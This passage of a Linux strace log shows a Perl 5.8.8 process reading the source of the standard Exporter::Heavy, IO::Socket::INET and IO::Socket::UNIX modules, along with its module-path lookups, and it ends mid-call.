@names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
12010 20:22:35.458084 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
12010 20:22:35.458292 brk(0x829c000)    = 0x829c000
12010 20:22:35.458686 read(8, "", 4096) = 0
12010 20:22:35.458703 close(8)          = 0
12010 20:22:35.459881 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
12010 20:22:35.460317 _llseek(6, 6496, [6496], SEEK_SET) = 0
12010 20:22:35.460336 _llseek(6, 0, [6496], SEEK_CUR) = 0
12010 20:22:35.460347 close(6)          = 0
12010 20:22:35.460418 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460436 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460494 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460510 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460539 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460552 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460567 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460580 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460594 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460607 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460621 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.460636 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
12010 20:22:35.460659 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
12010 20:22:35.460676 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79ee8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.460689 _llseek(6, 0, [0], SEEK_CUR) = 0
12010 20:22:35.460705 brk(0x82bd000)    = 0x82bd000
12010 20:22:35.460723 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
12010 20:22:35.461765 _llseek(6, 1386,  <unfinished ...>
